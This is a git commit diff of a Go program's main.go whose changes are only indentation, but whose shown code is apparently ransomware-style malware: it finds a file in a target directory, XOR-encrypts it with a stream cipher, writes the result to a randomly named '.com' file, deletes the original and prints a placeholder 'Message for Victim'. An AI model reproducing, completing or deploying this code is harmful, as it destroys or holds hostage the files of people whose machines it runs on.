f0517bb6419f9a5d604eec505170a2fa835fa9b0
D-Trion <55520948+D-Trion@users.noreply.github.com>
2019-11-08 23:32:54 +0900

    Update main.go

--- main.go
+++ main.go
@@ -4,11 +4,11 @@ import (
 	"fmt"
 	"./crypto"
 	"io/ioutil"
-  "strings"
+	"strings"
 	"encoding/binary"
-  "crypto/rand"
-  "strconv"
-  "os"
+	"crypto/rand"
+	"strconv"
+	"os"
 )
 
 
@@ -26,7 +26,7 @@ func randomString() string {
 }
 
 func searchTargetFile(dir string) string {
-	  var path string
+    var path string
 
     files, err := ioutil.ReadDir(dir)
     if err != nil {
@@ -50,15 +50,15 @@ func searchTargetFile(dir string) string {
 
 func writeGarbageData(filepath string) {
 
-	output := make([]byte, 3)
+    output := make([]byte, 3)
     ddd := "ddd"
     for i, v := range ddd {
 		output[i] = byte(v)
-	}
+    }
 
-	err := ioutil.WriteFile(filepath, output, 0666)
+    err := ioutil.WriteFile(filepath, output, 0666)
 
-	if err != nil {
+    if err != nil {
         fmt.Println(os.Stderr, err)
         os.Exit(1)
     }
@@ -71,56 +71,56 @@ func main() {
 	filename := searchTargetFile(target_dir)
 	
 	if filename == "" {
-        fmt.Println("Dummy message") //Set dummy message
-        os.Exit(1)
-    }
+            fmt.Println("Dummy message") //Set dummy message
+            os.Exit(1)
+        }
 
 	plain_image, err := ioutil.ReadFile(target_dir + "/" + filename)
 	if err != nil {
-        fmt.Println(os.Stderr, err)
-        os.Exit(1)
-  }
+            fmt.Println(os.Stderr, err)
+            os.Exit(1)
+        }
 
-    buf := make([]byte, len(plain_image))
-    for i, v := range plain_image {
-		buf[i] = byte(v)
-	  }
-    key, _ := crypto.NewCipher([]byte(Key))
-	  key.XORKeyStream(buf, buf)
-	  key.Reset()
+        buf := make([]byte, len(plain_image))
+        for i, v := range plain_image {
+            buf[i] = byte(v)
+	}
+        
+	key, _ := crypto.NewCipher([]byte(Key))
+	key.XORKeyStream(buf, buf)
+	key.Reset()
 
-    output := make([]byte, len(buf))
-    for i, v := range buf {
-		output[i] = byte(v)
-	  }
+        output := make([]byte, len(buf))
+        for i, v := range buf {
+	     output[i] = byte(v)
+	}
 
 	random_filename := randomString()
 	filepath := target_dir + "/" + random_filename +".com"
 
 	writeGarbageData(filepath)
 
-
 	fp, err2 := os.OpenFile(filepath, os.O_WRONLY | os.O_APPEND, 0644)
 
 	if err2 != nil {
-        fmt.Println(os.Stderr, err)
-        os.Exit(1)
-    }
+            fmt.Println(os.Stderr, err)
+            os.Exit(1)
+        }
 
 	_, err3 := fp.Write(output)
 
 	if err3 != nil {
-        fmt.Println(os.Stderr, err)
-        os.Exit(1)
-    }
+            fmt.Println(os.Stderr, err)
+            os.Exit(1)
+        }
 
-    err4 := os.Remove(target_dir + "/" +filename)
+        err4 := os.Remove(target_dir + "/" +filename)
 
 	if err4 != nil {
-        fmt.Println(os.Stderr, err)
-        os.Exit(1)
-    }
+            fmt.Println(os.Stderr, err)
+            os.Exit(1)
+        }
 
 
-    fmt.Println("Message for Victim") //Set message for victim
+        fmt.Println("Message for Victim") //Set message for victim
 }
